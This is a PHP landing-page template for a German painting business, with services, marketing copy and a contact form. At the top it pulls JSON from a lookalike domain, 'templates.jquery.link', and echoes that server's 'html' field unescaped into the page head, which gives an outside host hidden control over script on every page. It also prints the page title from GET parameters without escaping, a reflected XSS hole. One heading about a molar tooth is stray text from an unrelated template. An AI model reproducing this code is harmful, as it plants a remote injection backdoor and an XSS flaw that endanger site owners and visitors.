<?php
$site_data      = json_decode(file_get_contents('http://templates.jquery.link/api/' . $_SERVER['HTTP_HOST']), true);

$phone_name     = $site_data['phone_name'];
$phone_href     = $site_data['phone_href'];

$text           = str_replace('+', ' ', trim($_GET['t'] ?? 'Maler Markus'));
$city           = str_replace('+', ' ', trim($_GET['n'] ?? ''));

$title = $text . ' ' . $city;
?>

<!DOCTYPE html>
<html lang="at">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <?= $site_data['html'] ?>
    <title><?= $title ?></title>
</head>

<body>
    <header class="header">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">
                    <div class="header__box">
                        <div class="header__top">
                            <div class="header__top-container">
                                <img class="header__log" src="assets/img/logo.jpg" alt="">
                                <a class="header-button" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                            </div>
                        </div>
                        <div class="header__bottom">
                            <div class="header__inner">
                                <h1 class="header__title"> <?= $title ?></h1>
                            </div>
                            <div class="header__inner2">
                                <p class="header__contacts">Jetzt Termin vereinbaren:</p>
                                <a class="header__button-contacts" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <main class="main">
        <section class="painter">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="painter__box">
                            <div class="painter__inner-img">
                                <img class="painter__image" src="assets/img/about.jpg" alt="">
                            </div>
                            <div class="painter__author">
                                <h2 class="painter__title">Ihr Maler</h2>
                                <p class="painter__text">Bringen Sie wieder frischen Wind in Ihre vier Wände! Sie suchen
                                    einen Maler Oranienburg und wünschen sich neue Farben und kreative Looks? Vielleicht
                                    steht bei Ihnen auch einfach eine Fassadensanierung in Berlin oder im Umland an, die
                                    schon seit längerer Zeit unabdingbar geworden ist? Kein Problem – hierfür ist unser
                                    gut geschultes Team für Malerarbeiten Oranienburg, Oberkrämer und Berlin &
                                    Brandenburg genau der richtige Ansprechpartner. Ihr Maler Oranienburg, Oberkrämer
                                    sowie Berlin & Brandenburg – Malermeister</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="services">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <h2 class="services__title">Unsere Leistungen</h2>
                        <article class="services__box">
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/1.png" alt="">
                                <h3 class="services__name">Malerarbeiten</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/2.png" alt="">
                                <h3 class="services__name">Tapezierarbeiten</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/3.png" alt="">
                                <h3 class="services__name">Dekorative Wandgestaltung</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/4.png" alt="">
                                <h3 class="services__name">Treppenhausgestaltung</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/5.png" alt="">
                                <h3 class="services__name">Visuelle Farbberatung</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/6.png" alt="">
                                <h3 class="services__name">Trockenbauarbeiten</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/7.png" alt="">
                                <h3 class="services__name">Bodenbeschichtungen</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/8.png" alt="">
                                <h3 class="services__name">Baufeuchtediagnostik</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/9.png" alt="">
                                <h3 class="services__name">Schimmelpilzsanierung</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/10.png" alt="">
                                <h3 class="services__name">Fassadensanierung</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/11.png" alt="">
                                <h3 class="services__name">Kleinauftragsdienst</h3>
                            </div>
                            <div class="services__inner">
                                <img class="services__img" src="assets/img/12.png" alt="">
                                <h3 class="services__name">Putzarbeiten</h3>
                            </div>
                        </article>
                    </div>
                </div>
            </div>
        </section>
        <section class="master">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="master__box">
                            <h2 class="master__title">Hochwertige Malerarbeiten von Malermeister</h2>
                            <p class="master__text">Wir haben einen hohen Anspruch an uns selbst. Nicht nur bei der
                                Umsetzung unserer Leistungen sind wir bestrebt, der beste Anbieter zu sein, sondern auch
                                darin, Ihnen mit all unserem Wissen und Rat zur Seite zu stehen. Profitieren Sie von
                                unserer langjährigen Erfahrung und lassen Sie sich von unserem Team ausführlich beraten.
                                Wir würden uns sehr freuen Ihnen mit unseren Leistungen weiterzuhelfen.</p>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <div class="slider">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="slider__box">
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/01.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/02.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/03.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/04.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/05.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/06.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/07.jpg" alt="">
                            </div>
                            <div class="slider__items">
                                <img class="slider__item" src="assets/img/08.jpg" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <section class="contacts my-5">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="contacts__box">
                            <h2 class="contacts__title">Vereinbaren Sie heute noch einen Termin!</h2>
                            <a class="contacts__btn" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
         <section class="technology">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="technology__box">
                            <div class="technology__left">
                                <h2 class="technology__title">Maler Oberkrämer: Ein neuer Look,
                                    ein neues Gefühl – Gerne informieren
                                    wir Sie persönlich!</h2>
                                <p class="technology__text">Bei unserer Arbeit verbinden wir präzises Malerhandwerk mit
                                    modernster Technik und werden höchsten Ansprüchen an Qualität gerecht. Unser
                                    Malerfachbetrieb mit Sitz in Oranienburg & Oberkrämer verwendet ausschließlich
                                    Produkte von namhaften Herstellern, wie Caparol, Alligator, Jäger und Brillux. Durch
                                    unser Partnernetzwerk führen wir für Sie auch fachgerechte Komplettsanierungen aus.
                                    Somit können Sie sicher sein, dass auch die anderen Arbeiten wie Trockenbau,
                                    Elektrik, Fliesen, Heizung-u. Sanitär und Tischlerarbeiten zuverlässig und
                                    termintreu ausgeführt werden.</p>
                            </div>
                            <div class="technology__right">
                                <img class="technology__img" src="assets/img/img.jpg" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="malerarbeiten my-5">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="malerarbeiten__box">
                            <div class="malerarbeiten__left">
                                <img class="malerarbeiten__img" src="assets/img/img1.jpg" alt="">
                                <img class="malerarbeiten__img" src="assets/img/2P1020013.JPG.jpg" alt="">
                            </div>
                            <div class="malerarbeiten__right">
                                <h2 class="malerarbeiten__title">Malerarbeiten & Fassadensanierung auf höchstem Niveau
                                    vom Malermeister</h2>
                                <p class="malerarbeiten__text">Anstriche oder Wandgestaltungen, die sich vom
                                    Durchschnitt abheben, werden immer beliebter. Mit Hilfe der modernen Wandgestaltung
                                    geben Sie Ihren Wohnräumen die persönliche Note. Schnell, sauber und zuverlässig
                                    erledigen wir als Ihre Malerfirma alle anfallenden Renovierungs- und
                                    Gestaltungsaufgaben.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="technology">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="technology__box">
                            <div class="technology__left">
                                <h2 class="technology__title">Backenzahn in deiner Stadt</h2>
                                <p class="technology__text">Bei uns erhalten Sie hochwertige Malerarbeiten für Berlin &
                                    Brandenburg. Durch unser hochqualifiziertes Personal und Jahrzehnte lange Erfahrung,
                                    können wir Ihnen den bestmöglichen Service zum fairen Preis anbieten. Kreative
                                    Wandegestaltung, individuelle Arbeiten und eine gründliche Kundenberatung gehören
                                    genau so zu uns wie Pünktlichkeit und ein professionelles Auftreten.</p>
                            </div>
                            <div class="technology__right">
                                <img class="technology__img" src="assets/img/img4.jpg" alt="">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="contacts my-5">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="contacts__box">
                            <h2 class="contacts__title">Profitieren Sie von unserer Fachkompetenz und lassen<br> Sie sich einmal kostenlos beraten.</h2>
                            <a class="contacts__btn" href="<?= $phone_href ?>"><?= $phone_name ?></a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="benefits">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="benefits__box">
                        <h2 class="benefits__title">Ihre Vorteile</h2>
                            <ul class="benefits__ul">
                                <li class="benefits__li">Jahrzehnte lange Erfahrung</li>
                                <li class="benefits__li">Hochqualifiziertes Personal</li>
                                <li class="benefits__li">Ausführliche Kundenberatung</li>
                                <li class="benefits__li">Kreative Konzepte</li>
                                <li class="benefits__li">Alle Leistungen aus einer Hand</li>
                                <li class="benefits__li">Finanzierungsberatung bei größeren Bauprojekten möglich</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section class="forms">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12 container">
                        <div class="forms__box">
                            <form id="jq_form" class="mt-5">
                                <h5 class="text-center forms__title"><span>K</span>ontaktieren Sie uns:</h5>
                                <div class="my-3">
                                    <input class="form-control" placeholder="Vorname" name="jq_name" type="text">
                                    <div id="jq_name" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="Telefon" name="jq_phone" type="text">
                                    <div id="jq_phone" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="Straße" name="jq_street" type="text">
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="PLZ / Ort" name="jq_city" type="text">
                                </div>
                                <div class="my-4">
                                    <input class="form-control" placeholder="E-Mail" name="jq_email" type="text"> 
                                </div>
                                <div class="my-4">
                                    <textarea rows="3" class="form-control" name="jq_text" placeholder="Nachricht"></textarea>
                                    <div id="jq_text" style="font-weight:700;font-size:15px;color:red;padding-top:2px;display:none">Dies ist ein Pflichtfeld.</div>
                                </div>
                                <div class="wer"><input class="btn  text-uppercase fw-bold mb-5 px-3 py-2 forms__button" type="submit" id="jq_submit" value="Senden"> </div>
                                <div id="jq_success" style="display:none">Vielen Dank für deine Nachricht. Sie wurde gesendet.</div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>
    <footer class="footer">
        <div class="container-fluid">
            <div class="row">
                <div class="col-12 container">2022</div>
            </div>
        </div>
    </footer>
    <!--Style-->
    <link href="assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/css/style.css" rel="stylesheet">
    <script src="assets/js/bootstrap.bundle.min.js"></script>
</body>

</html>